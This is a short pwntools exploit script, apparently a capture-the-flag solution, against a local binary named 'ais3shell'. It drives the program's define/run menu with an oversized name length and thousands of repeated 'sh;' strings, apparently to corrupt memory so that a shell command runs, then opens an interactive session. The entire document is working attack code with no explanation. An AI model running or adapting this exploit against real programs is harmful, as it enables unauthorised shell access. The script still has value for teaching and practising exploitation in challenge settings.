from pwn import *

p = process('./ais3shell')

def list():
    p.sendlineafter('$ ', 'list')

def define(name_length, name, command_length, command):
    p.sendlineafter('$ ', 'define')
    p.sendafter('name: ', name_length)
    p.sendafter('name: ', name)
    p.sendafter('command: ', command_length)
    p.sendafter('Command: ', command)

def run_command(command):
    p.sendlineafter('$ ', 'run ' + command)

define(str(0x3e<<8+1), 'sh;'*5290, str(0x100), 'ls'*(0x100//2))
define('2', 'sl', '2', 'sl')
# define('10', 'ls', '10', 'ls')

p.interactive()